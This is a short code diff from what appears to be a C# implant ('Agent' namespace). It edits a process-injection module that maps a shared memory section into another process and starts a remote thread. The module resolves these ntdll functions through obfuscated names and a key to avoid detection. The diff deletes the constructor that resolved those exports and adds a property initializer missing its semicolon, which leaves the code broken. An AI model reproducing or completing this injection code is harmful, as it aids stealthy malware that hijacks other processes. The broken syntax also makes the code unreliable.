@@ -21,30 +21,11 @@ namespace Agent
         private IntPtr ncsFunc = IntPtr.Zero;
         private IntPtr mvsFunc = IntPtr.Zero;
         private IntPtr rcutFunc = IntPtr.Zero;
-        public bool resolved { get; set; }
+        public bool resolved { get; set; } = false
 
         private delegate uint nmpvosDelegate(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref ulong SectionOffset, ref ulong ViewSize, uint InheritDisposition, uint AllocationType, Native.MemoryProtection Win32Protect);
         private delegate uint ncsDelegate(ref IntPtr SectionHandle, Native.SectionAccess DesiredAccess, IntPtr ObjectAttributes, ref ulong MaximumSize, Native.MemoryProtection SectionPageProtection, Native.MappingAttributes AllocationAttributes, IntPtr FileHandle);
         private delegate IntPtr rcutDelegate(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, int stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, Native.CLIENT_ID clientId);
-
-        public MapViewOfSection()
-        {
-            ntdMod = Generic.GetLoadedModulePtr(map["ntd"], key);
-            if (ntdMod == IntPtr.Zero)
-            {
-                resolved = false;
-            }
-
-            var ncsFunc = Generic.GetExportAddr(ntdMod, map["ncs"], key);
-            var mvsFunc = Generic.GetExportAddr(ntdMod, map["nmvos"], key);
-            var rcutFunc = Generic.GetExportAddr(ntdMod, map["rcut"], key);
-
-            if(rcutFunc != IntPtr.Zero &&  mvsFunc != IntPtr.Zero && ncsFunc != IntPtr.Zero)
-            {
-                resolved = true;
-            }
-
-        }
 
         public bool Resolve()
         {
